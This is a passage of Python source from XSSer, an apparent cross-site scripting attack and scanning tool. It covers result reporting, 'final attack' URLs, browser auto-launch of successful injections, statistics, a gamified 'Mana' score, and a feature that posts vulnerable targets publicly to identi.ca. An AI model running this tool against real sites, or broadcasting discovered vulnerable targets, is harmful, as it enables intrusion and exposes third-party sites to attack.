                        fout.write("[-] Method: heuristic" + "\n" + '-'*50 +"\n")
                else:
                    pass
            else:
                self.auto_founded = self.auto_founded + 1
                self.report("[I] Target:", line[6])
                self.report("[+] Injection:", line[0])
                if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                    self.report("[*] Final Attack: ", attack_url)
                else:
                    pass
                self.report("[-] Method: xss")
                self.report("[-] Browsers:", line[1],  "\n", '-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("---------------------" + "\n")
                    fout.write("[I] Target: " + line[6] + "\n")
                    fout.write("[+] Injection: " + line[0] + "\n")
                    if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                        fout.write("[*] Final Attack: " +  attack_url + "\n")
                    else:
                        pass
                    fout.write("[-] Method: xss" + "\n")
                    fout.write("[-] Browsers: "+ line[1] +  "\n" + '-'*50 + "\n")

            if self.options.tweet:
            # XXX recover sns and username automatically
                self.report("[!] Trying to publish on: " + self.sn_service + "/" + self.sn_username)
                if self.options.fileoutput:
                    fout.write("[!] Published on: " + self.sn_service + "/" + self.sn_username + "\n")
                    fout.write("="*75 + "\n")

            if self.options.launch_browser:
                if self.options.dcp:
                    #XXX implement DCP autolauncher
                    self.report("\n[@] DCP autolauncher not implemented, yet. (http://docs.python.org/library/webbrowser.html)")
                    self.report("[!] Aborting all launching process!!. If you want to 'auto-launch' other results, try without --Dcp option\n")
                    self.report("[I] If you have some DCP success injections discovered, try to open -manually- these results in the website of your target. You will see that works! ;)\n")
                else:
                    if attack_url == "":
                        pass
                    else:
                        self._webbrowser.open(attack_url)

        # heuristic always with statistics
        if self.options.heuristic:
            self.options.statistics = True
	# some statistics reports
        if self.options.statistics:
            # heuristic test results
            if self.options.heuristic:
                self.report('='*75)
                self.report("[*] Heuristic:")
                self.report('='*75)
                self.report('-'*50)
                self.report('  ', "    <not-filt>", "   <filtered>", "    =" , "    ASCII",
                            "   +", "   UNE/HEX", "   +", "   DEC")
                # semicolon results
                heuris_semicolon_total_founded = self.heuris_semicolon_notfounded + self.heuris_une_semicolon_founded + self.heuris_dec_semicolon_founded
                self.report('; ',   "       ", self.heuris_semicolon_founded, "            ", heuris_semicolon_total_founded, "               ",
                            self.heuris_semicolon_notfounded, "            ",
                            self.heuris_une_semicolon_founded, "           ",
                            self.heuris_dec_semicolon_founded)
                # backslash results
                heuris_backslash_total_founded = self.heuris_backslash_notfounded + self.heuris_une_backslash_founded + self.heuris_dec_backslash_founded
                self.report('\\ ',  "       ", self.heuris_backslash_founded, "            ", heuris_backslash_total_founded, "               ",
                            self.heuris_backslash_notfounded, "            ",
                            self.heuris_une_backslash_founded, "           ",
                            self.heuris_dec_backslash_founded)
                # slash results
                heuris_slash_total_founded = self.heuris_slash_notfounded + self.heuris_une_slash_founded + self.heuris_dec_slash_founded
                self.report("/ ",   "       ", self.heuris_slash_founded, "            ",
                            heuris_slash_total_founded, "               ",
                            self.heuris_slash_notfounded, "            ",
                            self.heuris_une_slash_founded, "           ",
                            self.heuris_dec_slash_founded)
                # minor results
                heuris_minor_total_founded = self.heuris_minor_notfounded + self.heuris_une_minor_founded + self.heuris_dec_minor_founded
                self.report("< ",   "       ", self.heuris_minor_founded, "            ",
                            heuris_minor_total_founded, "               ",
                            self.heuris_minor_notfounded, "            ",
                            self.heuris_une_minor_founded, "           ",
                            self.heuris_dec_minor_founded)
                # mayor results
                heuris_mayor_total_founded = self.heuris_mayor_notfounded + self.heuris_une_mayor_founded + self.heuris_dec_mayor_founded
                self.report("> ",   "       ", self.heuris_mayor_founded, "            ",
                            heuris_mayor_total_founded, "               ",
                            self.heuris_mayor_notfounded, "            ",
                            self.heuris_une_mayor_founded, "           ",
                            self.heuris_dec_mayor_founded)
                # doublecolon results
                heuris_doublecolon_total_founded = self.heuris_doublecolon_notfounded + self.heuris_une_doublecolon_founded + self.heuris_dec_doublecolon_founded
                self.report('" ',   "       ", self.heuris_doublecolon_founded, "            ", heuris_doublecolon_total_founded, "               ",
                            self.heuris_doublecolon_notfounded, "            ",
                            self.heuris_une_doublecolon_founded, "           ",
                            self.heuris_dec_doublecolon_founded)
                # colon results
                heuris_colon_total_founded = self.heuris_colon_notfounded + self.heuris_une_colon_founded + self.heuris_dec_colon_founded
                self.report("' ",   "       ", self.heuris_colon_founded, "            ",
                            heuris_colon_total_founded, "               ",
                            self.heuris_colon_notfounded, "            ",
                            self.heuris_une_colon_founded, "           ",
                            self.heuris_dec_colon_founded)
                # equal results
                heuris_equal_total_founded = self.heuris_equal_notfounded + self.heuris_une_equal_founded + self.heuris_dec_equal_founded
                self.report("= ",   "       ", self.heuris_equal_founded, "            ",
                            heuris_equal_total_founded, "               ",
                            self.heuris_equal_notfounded, "            ",
                            self.heuris_une_equal_founded, "           ",
                            self.heuris_dec_equal_founded)
                self.report('-'*70)
                total_heuris_founded = heuris_semicolon_total_founded + heuris_backslash_total_founded + heuris_slash_total_founded + heuris_minor_total_founded + heuris_mayor_total_founded + heuris_doublecolon_total_founded + heuris_colon_total_founded + heuris_equal_total_founded
                
                total_heuris_params = total_heuris_founded + self.heuris_semicolon_founded + self.heuris_backslash_founded + self.heuris_slash_founded + self.heuris_minor_founded + self.heuris_mayor_founded + self.heuris_doublecolon_founded + self.heuris_colon_founded + self.heuris_equal_founded
                try:
                    _accur = total_heuris_founded * 100 / total_heuris_params
                except ZeroDivisionError:
                    _accur = 0
                self.report('Target(s) Filtering Accur: %s %%' % _accur)
                self.report('-'*70)
            # statistics block
            if len(self.hash_found) + len(self.hash_notfound) == 0:
                pass
            else:
                self.report('='*75)
                self.report("[*] Statistic:")
                self.report('='*75)
                test_time = datetime.datetime.now() - self.time
                self.report('-'*50)
                self.report("Test Time Duration: ", test_time)
                self.report('-'*50  )
                total_connections = self.success_connection + self.not_connection + self.forwarded_connection + self.other_connection
                self.report("Total Connections:", total_connections)
                self.report('-'*25)
                self.report("200-OK:" , self.success_connection , "|",  "404:" ,
                            self.not_connection , "|" , "503:" ,
                            self.forwarded_connection , "|" , "Others:",
                            self.other_connection)
                try:
                    _accur = self.success_connection * 100 / total_connections
                except ZeroDivisionError:
                    _accur = 0
                self.report("Connec: %s %%" % _accur)
                self.report('-'*50)
                total_payloads = self.check_positives + self.manual_injection + self.auto_injection + self.dcp_injection + self.dom_injection + self.xsa_injection + self.xsr_injection + self.coo_injection 
                self.report("Total Payloads:", total_payloads)
                self.report('-'*25)
                self.report("Checker:", self.check_positives,  "|", "Manual:",
                            self.manual_injection, "|" , "Auto:" ,
                            self.auto_injection ,"|", "DCP:",
                            self.dcp_injection, "|", "DOM:", self.dom_injection,
                            "|", "Induced:", self.httpsr_injection, "|" , "XSR:",
                            self.xsr_injection, "|", "XSA:",
                            self.xsa_injection , "|", "COO:",
                            self.coo_injection)
                self.report('-'*50)
                self.report("Total Injections:" , 
                            len(self.hash_notfound) + len(self.hash_found))
                self.report('-'*25)
                self.report("Failed:" , len(self.hash_notfound), "|",
                            "Sucessfull:" , len(self.hash_found))
                try:
                    _accur = len(self.hash_found) * 100 / total_injections
                except ZeroDivisionError:
                    _accur = 0
                self.report("Accur : %s %%" % _accur)
                self.report('-'*25)
                total_discovered = self.false_positives + self.manual_founded + self.auto_founded + self.dcp_founded + self.dom_founded + self.xsr_founded + self.xsa_founded + self.coo_founded
                self.report("Total Discovered:", total_discovered)
                self.report('-'*25)
                self.report("Checker:", self.false_positives, "|",
                            "Manual:",self.manual_founded, "|", "Auto:",
                            self.auto_founded, "|", "DCP:", self.dcp_founded,
                            "|", "DOM:", self.dom_founded, "|", "Induced:",
                            self.httpsr_founded, "|" , "XSR:", self.xsr_founded,
                            "|", "XSA:", self.xsa_founded, "|", "COO:",
                            self.coo_founded)
                self.report('-'*50)
                self.report("False positives:", self.false_positives, "|",
                            "Vulnerables:",
                            total_discovered - self.false_positives)
                self.report('-'*25)
	        # efficiency ranking:
	        # algor= vulnerables + false positives - failed * extras
	        # extras: 
	        ## 1 vuln -> identi.ca: +10000
	        ## >3 vuln -> 1 test: +4500
	        ## 1 vuln -> 1 test: +500 
	        ## >100 payloads: +150
	        ## proxy and heuristic: +100
	        ## final payload injected: +100
	        ## --Cem and --Doo: +75
	        ## manual payload injected and --Dcp: +25
	        ## checker: +10
                mana = 0
                if self.hash_found and self.options.tweet:
                    mana = mana + 10000
                if self.hash_found > 3:
                    mana = mana + 4500
                if self.hash_found == 1:
                    mana = mana + 500
                if total_payloads > 100:
                    mana = mana + 150
                if self.options.proxy:
                    mana = mana + 100
                if self.options.heuristic:
                    mana = mana + 100
                if self.options.finalpayload or self.options.finalremote:
                    mana = mana + 100
                if self.options.Cem or self.options.Doo:
                    mana = mana + 75
                if self.options.heuristic:
                    mana = mana + 50
                if self.options.script and not self.options.fuzz:
                    mana = mana + 25
                if self.options.followred and self.options.fli:
                    mana = mana + 25
                if self.options.dcp:
                    mana = mana + 25
                if self.options.hash:
                    mana = mana + 10
                mana = (len(self.hash_found) * mana) + mana -4500
                # enjoy it :)
                self.report("Mana:", mana)
                self.report("-"*50)
                #self.report('='*75 + '\n')
                # end statistics block

        c = Curl()
        if not len(self.hash_found) and self.hash_notfound:
            if self.options.hash:
                self.report("[!] Checker: looks like your target(s) does not repeat all received code.\n")
                if self.options.fuzz or self.options.dcp or self.options.script:
                    self.report("[I] Could not find any vulnerability!. Try another combination or hack it -manually- :)\n")
            else:
                self.report("[I] Could not find any vulnerability!. Try another combination or hack it -manually- :)\n")
            self.report('='*75 + '\n')
            if self.options.fileoutput:
                fout = open("XSSlist.dat", "a")
                fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                fout.write("---------------------" + "\n")
                fout.write("[!] Not reported 'positive' results for: \n" + "[-] " + str('\n[-] '.join([u[0] for u in self.hash_notfound])) + "\n")
                fout.write("="*75 + "\n")
                fout.close()
        else:
            # some exits and info for some bad situations:
            if len(self.hash_found) + len(self.hash_notfound) == 0 and not Exception:
                self.report("\nXSSer cannot send data :( ... maybe is -something- blocking our connections!?\n")
            if len(self.hash_found) + len(self.hash_notfound) == 0 and self.options.crawling:
                self.report("\nCrawlering system cannot recieve feedback from 'mosquitoes' on target host... try again :(\n")
            #if len(self.hash_found) + len(self.hash_notfound) == 0 and c.info()["http-code"] != "200":
            #    self.report("\nTarget responses with different HTTP code to: 200 [" + c.info()["http-code"] + "] ... cannot inject! :(\n")
            #self.report('='*75 + '\n')

        # print results to xml file
        if self.options.filexml:
            xml_report_results = xml_reporting(self)
            xml_report_results.print_xml_results(self.options.filexml)

        # publish discovered vulnerabilities
        if self.options.tweet and self.hash_found:
            try:
                shortener = ShortURLReservations('is.gd')
                shorturl_host = shortener.process_url(str(line[0]))
                    
                for line in self.hash_found:
                    sns_publish_results = publisher(self)
                    tags = '#xss '
                    if not self.options.tt:
                        msg = tags + 'vulnerable target: ' + shorturl_host
                    else:
                        tags = tags + self.options.tt
                        msg = tags + ' vulnerable target: ' + shorturl_host 
                    username = self.sn_username
                    password = self.sn_password
                    url = self.sn_url
                    sns_publish_results.send_to_identica(msg, username, password, url)
            except:
                self.report("\n[I] Error publishing some discovered XSS injections\n")
                pass

if __name__ == "__main__":
    app = xsser()
    options = app.create_options()
    if options:
        app.set_options(options)
        app.run()
    app.land(True)
